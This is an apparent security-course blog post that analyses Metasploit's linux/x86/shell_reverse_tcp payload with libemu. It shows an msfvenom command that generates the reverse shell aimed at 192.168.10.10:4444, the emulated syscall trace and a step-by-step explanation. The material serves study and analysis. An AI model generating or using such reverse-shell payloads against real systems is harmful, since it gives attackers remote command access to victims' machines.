---
title: "Linux x86 Shellcoding: Analysis of linux/x86/shell_reverse_tcp with Libemu"
date: 2018-04-09T17:16:07+02:00
---

Our goal will be to analyze the `linux/x86/shell_reverse_tcp` payload that comes bundled with Metasploit. In order to do so, we will use libemu, a library offering x86 emulation.

First, we will check out which options are needed to generate a sample with `msfvenom`.

```shell
root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp --payload-options
Options for payload/linux/x86/shell_reverse_tcp:


       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x86/shell_reverse_tcp
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 68
       Rank: Normal

Provided by:
    Ramon de C Valle <rcvalle@metasploit.com>
    joev <joev@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
CMD    /bin/sh          yes       The command string to execute
LHOST                   yes       The listen address
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell


Advanced options for payload/linux/x86/shell_reverse_tcp:

...
```

Therefore, we need to specify a value for `LHOST`, which for our exercise will be `192.168.10.10`.

We can then generate the payload with `msfvenom` and pipe it to libemu by using the following command:

```shell
root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.10 -f raw | sctest -S -s 100000 -vvv -G tcp_reverse_shell.dot
verbose = 3
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes

...
```

```c
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 168470720 (host=192.168.10.10);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 => 
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e => 
               = 0x00416fa6 => 
                   = "//bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;

```

The `sctest` output includes a nice C-like representation of the system calls being used in the shellcode, and we can clearly see the different elements that conform the typical reverse shell shellcode, like the one whose creation we described in a previous blog post.

Let's observe the execution flow with a graphical representation, which was generated as a dot file from the `-G` argument we specified for `sctest`. We can create a PNG image from this file easily: 

```
root@kali:~# dot tcp_reverse_shell.dot -T png > tcp_reverse_shell.png
```

![sctest TCP reverse shell graphical representation](/images/tcp_reverse_shell_sctest.png)

We can now see the flow clearly.


1. `socket()`: A socket is created by executing this system call with the following arguments:
2. `dup2()`: Called inside a loop to redirect `stderr`, `stdout` and `stdin` to the socket (2, 1, 0 respectively).
3. `connect()`: takes the file descriptor for the socket and a structure that contains the IP and port to connect to.
4. `execve()`: executes `/bin/sh`, and since standard input, output and error are redirected to the socket, it will effectively bring our shell to the remote IP and port, thus establishing the so-called reverse shell.




---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

*Student ID: SLAE-964*
